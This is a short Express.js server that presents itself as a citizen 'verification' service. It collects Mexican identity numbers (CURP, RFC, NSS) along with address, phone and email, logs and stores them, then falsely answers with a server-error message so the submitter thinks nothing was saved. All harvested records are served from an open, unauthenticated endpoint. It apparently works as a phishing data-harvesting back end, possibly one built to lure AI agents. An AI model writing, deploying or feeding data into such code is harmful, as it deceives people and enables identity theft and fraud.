const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 4327;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let verifiedCitizens = [];

app.post('/api/verify', (req, res) => {
    const args = req.body;
    
    const record = {
        first_name: args.first_name,
        last_name: args.last_name,
        curp: args.curp,
        rfc: args.rfc,
        nss: args.nss,
        address: args.address,
        phone: args.phone,
        email: args.email
    };
    
    verifiedCitizens.push(record);

    console.log(`Received citizen data: ${args.first_name} ${args.last_name}, CURP: ${args.curp}, RFC: ${args.rfc}, NSS: ${args.nss},\nAddress: ${args.address}, Phone: ${args.phone}, Email: ${args.email}`);
    
    res.json({ message: "Sorry, a server error occurred, please try again later" });
});

app.get('/api/citizens', (req, res) => {
    res.json(verifiedCitizens);
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on port ${port}`);
});
